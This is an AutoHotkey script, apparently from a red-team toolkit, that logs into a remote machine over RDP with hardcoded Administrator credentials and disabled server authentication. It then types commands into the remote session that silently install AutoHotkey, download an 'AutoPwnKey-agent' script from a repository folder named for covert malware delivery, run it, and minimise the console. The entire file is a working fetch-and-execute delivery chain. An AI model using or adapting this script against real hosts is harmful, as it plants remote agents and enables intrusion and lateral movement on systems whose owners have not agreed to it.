#Requires AutoHotkey v2.0
#SingleInstance Force

ConnectRDP(hostname, username, password, domain := "") {
    ; Define full system paths
    rdpFile := A_Temp "\temp.rdp"
    mstscPath := A_WinDir "\System32\mstsc.exe"
    cmdKeyPath := A_WinDir "\System32\cmdkey.exe"
    
    
    ; Build RDP content
    rdpSettings := [
        "screen mode id:i:2",
        "use multimon:i:0",
        "desktopwidth:i:1920",
        "desktopheight:i:1080",
        "session bpp:i:32",
        "winposstr:s:0,1,0,0,800,600",
        "compression:i:1",
        "keyboardhook:i:2",
        "audiocapturemode:i:0",
        "videoplaybackmode:i:1",
        "connection type:i:7",
        "networkautodetect:i:1",
        "bandwidthautodetect:i:1",
        "displayconnectionbar:i:1",
        "username:s:" username,
        "full address:s:" hostname,
        "prompt for credentials:i:0",
        "authentication level:i:0"
    ]
    
    if domain
        rdpSettings.Push("domain:s:" domain)
    
    rdpContent := ""
    for setting in rdpSettings
        rdpContent .= setting "`n"

    ; Write RDP file
    if FileExist(rdpFile)
        FileDelete(rdpFile)
        
    FileAppend(rdpContent, rdpFile)
    
    ; Store credentials temporarily
    cmdLine := '"' cmdKeyPath '" /generic:"' hostname '" /user:"' username '" /pass:"' password '"'
    RunWait(cmdLine,, "Hide")
    
    ; Launch RDP
    Run('"' mstscPath '" "' rdpFile '"')
    
    ; Clean up RDP file after a delay
    SetTimer(() => (FileExist(rdpFile) ? FileDelete(rdpFile) : ""), -5000)
    
    
    return true
} 

; Example usage:
hostname := "192.168.124.125"  ; or hostname
username := "Administrator"
password := "Password"
;domain := "DOMAIN"  ; Optional

result := ConnectRDP(hostname, username, password)

Sleep(300)

Send("{Left}{Enter}") 

; Wait for and activate the RDP window
WinWait("temp - " hostname " - Remote Desktop Connection")
WinActivate("temp - " hostname " - Remote Desktop Connection")
Sleep(2500)
; Send Windows+X, then r for run
Send("#x")
Sleep(300)  ; Small delay to ensure menu appears
Send("r")
Sleep(500)  ; Delay to allow window to open
Send("{Backspace}")
Send("cmd")
Send("{Enter}")
Sleep(800) ; Delay to allow window to open
Send('{Text}curl -L -o ahk.exe https://github.com/AutoHotkey/AutoHotkey/releases/download/v2.0.19/AutoHotkey_2.0.19_setup.exe && ahk.exe /silent /installto %USERPROFILE%\AppData\Local\Programs\AutoHotkey && timeout 3 && curl -L -o script.ahk https://raw.githubusercontent.com/CroodSolutions/AutoPwnKey/refs/heads/main/1%20-%20Covert%20Malware%20Delivery%20and%20Ingress%20Tool%20Transfer/AutoPwnKey-agent.ahk && timeout 3 && %USERPROFILE%\AppData\Local\Programs\AutoHotkey\v2\AutoHotkey64.exe script.ahk')
Send("{Enter}")
Sleep(300)
Send("#{Down}") ; Minimize cmd
